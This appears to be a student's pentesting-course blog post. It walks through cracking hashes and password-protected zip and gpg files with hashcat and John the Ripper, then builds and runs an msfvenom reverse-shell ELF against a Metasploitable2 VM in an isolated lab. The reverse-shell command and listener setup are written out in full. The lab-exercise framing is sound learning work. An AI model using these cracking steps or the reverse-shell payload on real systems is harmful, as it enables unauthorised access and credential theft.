<!DOCTYPE html>
<html lang="en">
    <head><script src="/tuukkaani-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=tuukkaani-blog/livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content=" a) Installing and testing Hashcat So firstly I will install all the required programs and test it&rsquo;s functionality on the following hash: 6b1628b016dff46e6fa35684be6acc96
It seems like hashcat is already installed on my system:
To test out the program, I&rsquo;ll be following Tero&rsquo;s short guide at: Cracking passwords with hashcat. So firstly I&rsquo;m tasked to install hashid hashcat wget so let&rsquo;s see if I have all of those installed.
" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/tuukkaani-blog/pentesting-course/h5/" />


    <title>
        
            H5 - Password cracking with Hashcat &amp; John :: tuukkaani-blog 
        
    </title>





  <link rel="stylesheet" href="/tuukkaani-blog/main.min.2729760c629597024c5de34b40ea9f372f2b5a2a192dcdca537b7ddfa483eab8.css" integrity="sha256-Jyl2DGKVlwJMXeNLQOqfNy8rWioZLc3KU3t936SD6rg=" crossorigin="anonymous">





    <link rel="apple-touch-icon" sizes="180x180" href="/tuukkaani-blog/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/tuukkaani-blog/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/tuukkaani-blog/favicon-16x16.png">
    <link rel="manifest" href="/tuukkaani-blog/site.webmanifest">
    <link rel="mask-icon" href="/tuukkaani-blog/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/tuukkaani-blog/favicon.ico">
    <meta name="msapplication-TileColor" content="">



  <meta itemprop="name" content="H5 - Password cracking with Hashcat & John">
  <meta itemprop="description" content="a) Installing and testing Hashcat So firstly I will install all the required programs and test it’s functionality on the following hash: 6b1628b016dff46e6fa35684be6acc96
It seems like hashcat is already installed on my system:
To test out the program, I’ll be following Tero’s short guide at: Cracking passwords with hashcat. So firstly I’m tasked to install hashid hashcat wget so let’s see if I have all of those installed.">
  <meta itemprop="datePublished" content="2025-10-01T00:00:00+00:00">
  <meta itemprop="dateModified" content="2025-10-01T00:00:00+00:00">
  <meta itemprop="wordCount" content="1294">
  <meta itemprop="keywords" content="Pentesting-Course">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="H5 - Password cracking with Hashcat & John">
  <meta name="twitter:description" content="a) Installing and testing Hashcat So firstly I will install all the required programs and test it’s functionality on the following hash: 6b1628b016dff46e6fa35684be6acc96
It seems like hashcat is already installed on my system:
To test out the program, I’ll be following Tero’s short guide at: Cracking passwords with hashcat. So firstly I’m tasked to install hashid hashcat wget so let’s see if I have all of those installed.">





    <meta property="article:section" content="pentesting-course" />



    <meta property="article:published_time" content="2025-10-01 00:00:00 &#43;0000 UTC" />












    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/tuukkaani-blog/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                Hello there!</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#00ffcc;
                   animation-duration:1.5s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/tuukkaani-blog/">Home</a></li><li><a href="/tuukkaani-blog/pentesting-course/">Pentesting Course</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/tuukkaani-blog/pentesting-course/h5/">H5 - Password cracking with Hashcat &amp; John</a></h2>

            
            
            

            <div class="post-content">
                <hr>
<h3 id="a-installing-and-testing-hashcat">a) Installing and testing Hashcat</h3>
<p>So firstly I will install all the required programs and test it&rsquo;s functionality on the following hash: <em>6b1628b016dff46e6fa35684be6acc96</em></p>
<p>It seems like hashcat is already installed on my system:</p>
<p><img src="/tuukkaani-blog/img/h5/hashcat_help.png" alt="Hashcat &ndash;help"></p>
<p>To test out the program, I&rsquo;ll be following Tero&rsquo;s short guide at: <a href="https://terokarvinen.com/2022/cracking-passwords-with-hashcat/">Cracking passwords with hashcat</a>. So firstly I&rsquo;m tasked to install <code>hashid hashcat wget</code> so let&rsquo;s see if I have all of those installed.</p>
<p><img src="/tuukkaani-blog/img/h5/guide_programs.png" alt="Installed programs"></p>
<p>It seems everything is good to go!</p>
<p>Next I create a new directory for testing purposes <code>mkdir hashed</code> and go into the new directory <code>cd hashed</code>. After which I&rsquo;ll be making my life a bit easier by putting the hash into a text file <code>echo &quot;6b1628b016dff46e6fa35684be6acc96&quot; &gt; hash.txt</code></p>
<p>Now I&rsquo;m going to be using the rockyou wordlist which I get by <code>wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz</code>.
After the file gets on my machine, I use <code>aunpack rockyou.txt.tar.gz</code>
but you can also use <code>tar xf rockyou.txt.tar.gz</code> to unpack the file.</p>
<p><img src="/tuukkaani-blog/img/h5/aunpack.png" alt="Rockyou.txt"></p>
<p>Now, I need to identify the hash type. I could go by eyeing through some example hashes, but there are fortunately tools to make this a bit easier. This time I&rsquo;ll be using hashid.
By doing <code>hashid -m hash.txt</code> I get the following:</p>
<p><img src="/tuukkaani-blog/img/h5/hash_types.png" alt="Hashid output"></p>
<p>MD5 is quite common compared to the other two so that&rsquo;s what I&rsquo;ll be trying out first. Hashid gave me the hashcat mode which in this case is 0, I can start cracking by
<code>hashcat -m 0 hash.txt rockyou.txt -o cracked</code></p>
<p>I get the cracked hash in the specified output file &lsquo;cracked&rsquo; and with <code>cat cracked</code> I get the cracked hash:</p>
<p><img src="/tuukkaani-blog/img/h5/cracked.png" alt="Cracked hash"></p>
<p><a href="https://terokarvinen.com/2022/cracking-passwords-with-hashcat/.">(Tero Karvinen 2022.)</a></p>
<hr>
<h3 id="b-installing-and-testing-john-the-ripper">b) Installing and testing John the Ripper</h3>
<p>Like the previous section, I&rsquo;ll be going through a guide Tero has made called: <a href="https://terokarvinen.com/2023/crack-file-password-with-john/">Crack File Password With John</a>.</p>
<p>Firstly I&rsquo;ll install the prerequisites I need with the following:
<code>sudo apt install build-essential libssl-dev zlib1g zlib1g-dev zlib1g-gst libbz2-1.0 libbz2-dev zip</code>. I can&rsquo;t seem to find the zlib1g-gst package, so I <code>sudo apt search zlib1g</code> and don&rsquo;t seem to find the package there either. So I go check out the <a href="https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL-UBUNTU">john installation readme</a> and install the following:
<code>sudo apt install build-essential libssl-dev zlib1g-dev zip libbz2-dev</code>.</p>
<p>This time the installation completed successfully.</p>
<p>Now I need to clone the john repository and build it. So firstly I clone the repo: <code>git clone https://github.com/openwall/john.git</code>. Next I navigate to the <em>john/src/</em> directory and run <code>./configure</code>. I check the missing libraries list and I got everything I need installed. After which I run <code>make -s clean &amp;&amp; make -sj4</code> to start compiling.</p>
<p>I navigate to the john/run/ directory and run <code>./john</code> and everything seems to be in order:</p>
<p><img src="/tuukkaani-blog/img/h5/john.png" alt="John the ripper"></p>
<p>Next I need a file to crack open, luckily Tero has a password protected zip for this purpose. To get the file I do <code>wget https://TeroKarvinen.com/2023/crack-file-password-with-john/tero.zip</code>. I&rsquo;ll try to unpack the zip file and it indeed seems to be password protected. Tero wasn&rsquo;t lying.</p>
<p><img src="/tuukkaani-blog/img/h5/tero_zip.png" alt="Tero.zip"></p>
<p>So now to crack the file I need to first extract the hash from the zip file. To do so I use zip2john:
<code>~/john/run/zip2john tero.zip &gt; tero.zip.hash</code>.</p>
<p>After which I <code>cat</code> the output file and get the following:</p>
<p><img src="/tuukkaani-blog/img/h5/tero_hash.png" alt="Tero hash"></p>
<p>Lastly I let john go at the hash and see if we get anything open:
<code>~/john/run/john tero.zip.hash</code> and it seems we got the password.</p>
<p><img src="/tuukkaani-blog/img/h5/tero_pass.png" alt="Tero password"></p>
<p>After unpacking the files and using the password <em>butterfly</em> I get the secretFiles directory with a file SECRET.md with the following contents:</p>
<p><img src="/tuukkaani-blog/img/h5/flag.png" alt="SECRET.md"></p>
<p><a href="https://terokarvinen.com/2023/crack-file-password-with-john/">(Tero Karvinen 2023.)</a></p>
<hr>
<h3 id="c-making-a-password-protected-file-and-cracking-it">c) Making a password protected file and cracking it</h3>
<p>I begin with creating a directory for the task <code>mkdir c</code> and navigate inside it. Then I create a another directory called <em>secret</em> and inside it I create a text file. I pack the files using <code>tar -cf secret.tar secret</code> and now due to tar not providing me with any type of encryption I googled what I could be using for this task.</p>
<p>I came across an article by <a href="https://linuxconfig.org/how-to-create-compressed-encrypted-archives-with-tar-and-gpg">Justin Chapin</a>, in which they use gpg to encrypt a tar file&hellip; Convenient! So now I encrypt the files with <code>gpg -c secret.tar</code>. <a href="https://linuxconfig.org/how-to-create-compressed-encrypted-archives-with-tar-and-gpg">(Justin Chapin 2025.)</a>.</p>
<p>Now that we have our target file. Let&rsquo;s crack it open by using john once more. If I try to decrypt the file I get a prompt asking for the password.</p>
<p><img src="/tuukkaani-blog/img/h5/gpg_pass.png" alt="gpg secret"></p>
<p>So lets start with running:
<code>~/john/run/gpg2john secret.tar.gpg &gt; secret.hash</code>.</p>
<p>I <code>cat</code> the output file and see the hash:</p>
<p><img src="/tuukkaani-blog/img/h5/gpg_hash.png" alt="gpg hash"></p>
<p>Lastly lets use john to crack the hash:
<code>~/john/run/john --wordlist=wordlist.txt secret.hash</code></p>
<p><img src="/tuukkaani-blog/img/h5/gpg_cracked.png" alt="gpg crack"></p>
<p>And now if I use <code>~/john/run/john --show secret.hash</code> I see the password:</p>
<p><img src="/tuukkaani-blog/img/h5/benstiller.png" alt="Password"></p>
<p>And inside the newly extracted directory I find benstiller.txt:</p>
<p><img src="/tuukkaani-blog/img/h5/darksecret.png" alt="Dark secret"></p>
<p>No wonder this was behind a password. Someone might steal such an amazing movie idea and make MILLIONS!!!</p>
<hr>
<h3 id="d-making-a-hash-for-a-text-file-and-cracking-it">d) Making a hash for a text file and cracking it</h3>
<p>Lets make the target file. I&rsquo;ll use SHA-1 for the file <code>echo -n &quot;your secret&quot; | sha1sum &gt; secret</code>. Then I ran <code>hashid secret</code> and it failed to recognize the hash. I quickly realized I had an extra dash at the end so I quickly removed it from the file and it worked:</p>
<p><img src="/tuukkaani-blog/img/h5/sha1.png" alt="Sha1"></p>
<p>Using <code>hashid -m secret</code> I get the hashcat mode for SHA-1 which is 100.
Lastly I run <code>hashcat -m 100 secret rockyou.txt -o cracked</code> and we get what we came for:</p>
<p><img src="/tuukkaani-blog/img/h5/shaben.png" alt="Shaben"></p>
<hr>
<h3 id="e-using-msfvenom-to-create-a-reverse-shell-to-a-target-machine">e) Using msfvenom to create a reverse shell to a target machine.</h3>
<p>For this task I&rsquo;ll be using the following setup:</p>
<p>Target: Metasploitable2 virtual machine / 10.10.10.11</p>
<p>Host: Kali virtual machine / 10.10.10.10</p>
<p>I double check my virtual machines can&rsquo;t connect to internet. They are using a bridge that has no actual interfaces to use so they can only communicate with each other. On my the kali machine I open port 4444/tcp temporarily to use for testing by <code>ufw allow 4444/tcp</code>.</p>
<p>After the setup I start with msfvenom. I found good examples from <a href="https://www.offsec.com/metasploit-unleashed/msfvenom/">OffSec</a> and made modifications to fit my needs.</p>
<p><code>-a x86</code> to specify the target architecture.
<code>--platform linux</code> to specify the target platform.
<code>-p linux/x86/reverse_shell_tcp</code> to specify the payload.
<code>LHOST=10.10.10.10</code> and <code>LPORT=4444</code> to connect to our host.
<code>-e generic/none</code> skips encoding.
<code>-f elf</code> to format the output as .elf. I tried other formats like python and bash but couldn&rsquo;t get them to run properly.
<code>&gt; reverse_shell.elf</code> lastly saves the output to a file.</p>
<p><code>msfvenom -a x86 --platform linux -p linux/x86/reverse_shell_tcp LHOST=10.10.10.10 LPORT=4444 -e generic/none -f elf &gt; reverse_shell.elf</code></p>
<p>Then I use <code>msfconsole</code> to start a listening session <code>use exploit/multi/handler</code>. Then I set all the needed info <code>set LHOST 10.10.10.10</code>, <code>set LPORT 4444</code> and <code>set payload linux/x86/shell_reverse_tcp</code>.
I start the session with <code>exploit</code>.</p>
<p>After which I use ftp to login to the target and transfer the file:
<code>ftp msfadmin@10.10.10.11</code> and <code>put reverse_shell.elf</code></p>
<p>On the target machine, I make the file executable <code>chmod a+x reverse_shell.elf</code>. Then I run the file <code>./reverse_shell.elf</code></p>
<p>After which we get a connection on our host machine:</p>
<p><img src="/tuukkaani-blog/img/h5/msfvenom.png" alt="Reverse shell"></p>
<p>Lastly I close the opened 4444 <code>sudo ufw deny 4444/tcp</code>.</p>
<p><a href="https://www.offsec.com/metasploit-unleashed/msfvenom/">(OffSec.)</a></p>
<hr>
<h3 id="x-additional-reading">x) Additional reading</h3>
<h4 id="cracking-passwords-with-hashcat">Cracking passwords with hashcat</h4>
<ul>
<li>
<p>Very straight forward and quickly gives all the necessary info on using hashcat.</p>
</li>
<li>
<p>Possible addition could be instead of using a premade hash, it could instruct the user to create a md5 hash from a common password (benstiller for example). And then go on as it is currently, after which the user could be asked to check out other formats like SHA etc.</p>
</li>
</ul>
<p><a href="https://terokarvinen.com/2022/cracking-passwords-with-hashcat/.">(Tero Karvinen 2022.)</a></p>
<h4 id="crack-file-passwords-with-john">Crack file passwords with john</h4>
<ul>
<li>
<p>In this section we do have a call to action at the end where we are encouraged to create and crack some files.</p>
</li>
<li>
<p>Feels like an improvement over the hashcat guide.</p>
</li>
</ul>
<p><a href="https://terokarvinen.com/2023/crack-file-password-with-john/">(Tero Karvinen 2023.)</a></p>
<h3 id="sources">Sources</h3>
<p>All the assignments this page is based on can be found at <a href="https://terokarvinen.com/tunkeutumistestaus/">Tero Karvinen</a></p>
<p><a href="https://terokarvinen.com/2022/cracking-passwords-with-hashcat/">Tero Karvinen 2022. Cracking passwords with hashcat.</a></p>
<p><a href="https://terokarvinen.com/2023/crack-file-password-with-john/">Tero Karvinen 2023. Crack file password with john.</a></p>
<p><a href="https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL-UBUNTU">John the ripper github 2022. INSTALL-UBUNTU</a></p>
<p><a href="https://linuxconfig.org/how-to-create-compressed-encrypted-archives-with-tar-and-gpg">Justin Chapin 2025. How to create compressed encrypted archives with tar and gpg.</a></p>
<p><a href="https://www.offsec.com/metasploit-unleashed/msfvenom/">OffSec. MSFvenom.</a></p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="http://localhost:1313/tuukkaani-blog/categories/pentesting-course/">pentesting-course</a></span>
        
    </p>

  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/tuukkaani-blog/bundle.min.ad54ad97364f77ede35def9096b162bb1f0b3973aa50b080f5e82fa147f6882e2a7200d7535adbf9b51bebf939f1c1ca9bbe6be87530092aca720eac4a226fda.js" integrity="sha512-rVStlzZPd&#43;3jXe&#43;QlrFiux8LOXOqULCA9egvoUf2iC4qcgDXU1rb&#43;bUb6/k58cHKm75r6HUwCSrKcg6sSiJv2g=="></script>




    </body>
</html>
